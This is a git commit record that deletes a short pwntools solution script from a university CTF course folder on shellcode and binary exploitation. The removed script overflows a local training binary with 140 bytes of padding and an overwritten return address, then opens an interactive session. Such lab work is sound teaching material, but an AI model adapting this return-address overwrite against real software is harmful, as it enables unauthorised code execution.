bb4a98c2d53a97218a1934eecb319f12bbc1ca5b
Gabriel Rovesti <rovestigabriel@gmail.com>
2022-12-28 23:15:41 +0100

    Varie ed eventuali

--- Conti/2022-2023/Challenges and Solutions/Pwning - Lessons 14,15,16,17/15 - Shellcode/15Challenges/Challenges/1_enc_pwn1/solution.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-
-p = process('./pwn1')
-garbage = 'a' * 140
-target_address = 0x080484ad
-address = p32(target_address)
-msgin = garbage.encode('ascii') + address
-p.sendline(msgin)
-p.interactive()
